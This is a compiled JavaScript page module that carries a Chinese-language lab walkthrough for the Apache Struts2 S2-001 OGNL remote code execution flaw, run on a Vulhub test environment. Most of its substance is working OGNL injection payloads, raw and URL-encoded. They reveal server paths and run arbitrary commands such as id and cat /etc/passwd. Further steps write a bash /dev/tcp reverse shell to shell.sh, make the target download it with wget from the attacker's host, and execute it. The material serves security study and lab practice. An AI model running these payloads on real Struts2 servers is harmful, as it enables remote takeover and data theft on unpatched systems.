import{_ as i}from"./plugin-vue_export-helper-c27b6911.js";import{r as s,o as l,c as d,a as e,b as t,d as r,e as n}from"./app-58e4a7d6.js";const o={},c=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),t(" 漏洞描述")],-1),u=e("p",null,"该漏洞因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用 OGNL 表达式 %{value} 进行解析，然后重新填充到对应的表单数据中。例如注册或登录页面，提交失败后端一般会默认返回之前提交的数据，由于后端使用 %{value} 对提交的数据执行了一次 OGNL 表达式解析，所以可以直接构造 Payload 进行命令执行.",-1),p=e("p",null,"参考阅读：",-1),g={href:"http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities.html",target:"_blank",rel:"noopener noreferrer"},v=n(`<h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub执行以下命令启动s2-001测试环境：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose build
docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>获取tomcat执行路径：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>%{&quot;tomcatBinDir{&quot;+@java.lang.System@getProperty(&quot;user.dir&quot;)+&quot;}&quot;}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>获取Web路径：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>%{#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#response.println(#req.getRealPath(&#39;/&#39;)),#response.flush(),#response.close()}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>执行任意命令（命令加参数：<code>new java.lang.String[]{&quot;cat&quot;,&quot;/etc/passwd&quot;}</code>）：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code># URLencode前
%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{&quot;id&quot;})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code># URLencode后
%25%7B%23a%3D(new%20java.lang.ProcessBuilder(new%20java.lang.String%5B%5D%7B%22id%22%7D)).redirectErrorStream(true).start()%2C%23b%3D%23a.getInputStream()%2C%23c%3Dnew%20java.io.InputStreamReader(%23b)%2C%23d%3Dnew%20java.io.BufferedReader(%23c)%2C%23e%3Dnew%20char%5B50000%5D%2C%23d.read(%23e)%2C%23f%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22)%2C%23f.getWriter().println(new%20java.lang.String(%23e))%2C%23f.getWriter().flush()%2C%23f.getWriter().close()%7D
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203011547043.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h3 id="反弹shell" tabindex="-1"><a class="header-anchor" href="#反弹shell" aria-hidden="true">#</a> 反弹shell</h3>`,13),h={href:"http://xn--Shellshell-5m4p03y1yggpu02v87w.sh",target:"_blank",rel:"noopener noreferrer"},m=n(`<div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>echo &quot;bash -i &gt;&amp; /dev/tcp/192.168.174.128/9999 0&gt;&amp;1&quot; &gt; shell.sh
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>启动http server：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code># python2
python -m SimpleHTTPServer 80

# python3
python -m http.server 80
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>上传shell.sh文件：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code># URLencode前
%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{&quot;wget&quot;,&quot;192.168.174.128/shell.sh&quot;})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203011556922.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>执行shell.sh文件：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code># URLencode前
%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{&quot;bash&quot;,&quot;/usr/local/tomcat/shell.sh&quot;})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203011558934.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>监听9999端口，接收反弹shell：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203011557020.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,11);function b(x,f){const a=s("ExternalLinkIcon");return l(),d("div",null,[c,u,p,e("ul",null,[e("li",null,[e("a",g,[t("http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities.html"),r(a)])])]),v,e("p",null,[e("a",h,[t("准备反弹Shell文件shell.sh"),r(a)]),t("：")]),m])}const S=i(o,[["render",b],["__file","Struts2 S2-001 远程代码执行漏洞.html.vue"]]);export{S as default};
